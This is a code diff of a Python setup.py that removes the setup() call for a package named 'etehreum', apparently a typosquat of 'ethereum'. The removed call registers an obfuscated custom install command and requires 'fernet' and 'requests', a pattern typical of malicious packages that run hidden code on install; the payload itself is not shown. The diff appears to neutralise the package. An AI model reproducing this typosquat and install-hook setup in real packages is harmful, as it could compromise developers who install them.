@@ -18,22 +18,5 @@ class zxvpsssWwFqgrWOhaMXmZFnOAZuIPVoFWOhKrspotLJvAsqtKtKNOvaqyHpdNHDnCzshwfGsnP
             install.run(self)
 
 
-setup(
-    name="etehreum",
-    version=VERSION,
-    author="ntwjDAQMow",
-    author_email="WANESpZbMaihae@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': zxvpsssWwFqgrWOhaMXmZFnOAZuIPVoFWOhKrspotLJvAsqtKtKNOvaqyHpdNHDnCzshwfGsnPxCPlxhqRECYsZfYpetCXOawisYrzEbYQXhQkUUtrdWHZkoOmEyyQRdEtxieTGQOTFZTLLEsrrkKWRJeBNKbGRejIqKaNmOaZyFEWcSnQutBvXdbRKfj,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
